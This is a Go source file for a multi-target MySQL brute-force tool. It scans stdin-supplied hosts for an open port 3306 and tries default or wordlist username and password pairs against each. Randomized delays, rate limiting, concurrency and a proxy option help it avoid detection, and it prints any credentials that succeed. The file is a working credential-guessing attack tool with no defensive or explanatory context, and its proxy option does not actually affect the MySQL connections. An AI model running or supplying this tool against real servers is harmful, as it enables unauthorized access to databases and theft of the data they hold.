package main

import (
	"bufio"
	"database/sql"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"
	"io/ioutil"
	"github.com/go-sql-driver/mysql"

	_ "github.com/go-sql-driver/mysql"
)

type Credential struct {
	Username string
	Password string
}

type Result struct {
	Target   string
	Username string
	Password string
}

func init() {
	log.SetOutput(ioutil.Discard)
	log.SetOutput(os.Stdout) 
	log.SetFlags(0)    
	mysql.SetLogger(log.New(ioutil.Discard, "", 0))
}

func isPortOpen(host string, port int, verbose bool) bool {
	address := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.DialTimeout("tcp", address, 3*time.Second)
	if err != nil {
		if verbose {
			fmt.Printf("[-] Port 3306 is closed on %s\n", host)
		}
		return false
	}
	_ = conn.Close()
	if verbose {
		fmt.Printf("[+] Port 3306 is open on %s\n", host)
	}
	return true
}

func bruteForceMySQL(target string, usernames, passwords []string, timeout int, tls bool, proxy string, limiter <-chan time.Time, verbose bool, results chan<- Result) {
	rand.Seed(time.Now().UnixNano())

	dsnTemplate := "%s:%s@tcp(%s:3306)/"
	if tls {
		dsnTemplate = "%s:%s@tcp(%s:3306)/?tls=true"
	}

	for _, username := range usernames {
		for _, password := range passwords {
			<-limiter // Rate limit

			if verbose {
				fmt.Printf("\r[*] Trying combination: %s:%s", username, password)
			}

			dsn := fmt.Sprintf(dsnTemplate, username, password, target)
			if proxy != "" {
				os.Setenv("HTTP_PROXY", proxy)
				os.Setenv("HTTPS_PROXY", proxy)
			}

			db, err := sql.Open("mysql", dsn)
			if err != nil {
				continue
			}
			defer db.Close()

			db.SetConnMaxLifetime(time.Duration(timeout) * time.Second)

			err = db.Ping()
			if err == nil {
				results <- Result{Target: target, Username: username, Password: password}
				if verbose {
					fmt.Printf("\r[+] Success - URL: %s, Username: %s, Password: %s\n", target, username, password)
				}
				return
			}

			delay := rand.Intn(500) + 500
			time.Sleep(time.Duration(delay) * time.Millisecond)
		}
	}
}

func main() {
	var (
		wordlistPath string
		usernamePath string
		verbose      bool
		concurrency  int
		timeout      int
		tls          bool
		proxy        string
	)

	flag.StringVar(&wordlistPath, "w", "", "Path to password wordlist")
	flag.StringVar(&usernamePath, "u", "", "Path to username wordlist")
	flag.BoolVar(&verbose, "v", false, "Enable verbose output")
	flag.IntVar(&concurrency, "c", 5, "Number of concurrent threads")
	flag.IntVar(&timeout, "t", 5, "Connection timeout in seconds")
	flag.BoolVar(&tls, "tls", false, "Enable TLS for MySQL connections")
	flag.StringVar(&proxy, "proxy", "", "HTTP proxy to use for connections")
	flag.Parse()

	scanner := bufio.NewScanner(os.Stdin)
	targets := []string{}
	for scanner.Scan() {
		input := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(input, "http://") || strings.HasPrefix(input, "https://") {
			input = strings.TrimPrefix(strings.TrimPrefix(input, "http://"), "https://")
		}
		targets = append(targets, input)
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("[!] Error reading input: %v\n", err)
		return
	}

	if len(targets) == 0 {
		fmt.Println("[!] No targets provided")
		return
	}

	usernames := []string{"root", "admin", "user"}
	passwords := []string{"password", "123456", "admin"}

	if usernamePath != "" {
		file, err := os.Open(usernamePath)
		if err != nil {
			fmt.Printf("[!] Error opening username file: %v\n", err)
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		usernames = []string{}
		for scanner.Scan() {
			usernames = append(usernames, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			fmt.Printf("[!] Error reading username file: %v\n", err)
			return
		}
	}

	if wordlistPath != "" {
		file, err := os.Open(wordlistPath)
		if err != nil {
			fmt.Printf("[!] Error opening password file: %v\n", err)
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		passwords = []string{}
		for scanner.Scan() {
			passwords = append(passwords, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			fmt.Printf("[!] Error reading password file: %v\n", err)
			return
		}
	}

	results := make(chan Result, len(targets))
	var wg sync.WaitGroup
	limiter := time.NewTicker(time.Duration(1000/concurrency) * time.Millisecond)
	defer limiter.Stop()

	for _, target := range targets {
		if !isPortOpen(target, 3306, verbose) {
			continue
		}

		wg.Add(1)
		go func(target string) {
			defer wg.Done()
			bruteForceMySQL(target, usernames, passwords, timeout, tls, proxy, limiter.C, verbose, results)
		}(target)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	for result := range results {
		if !verbose {
			fmt.Printf("[+] Success - URL: %s, Username: %s, Password: %s\n", result.Target, result.Username, result.Password)
		}
	}
}
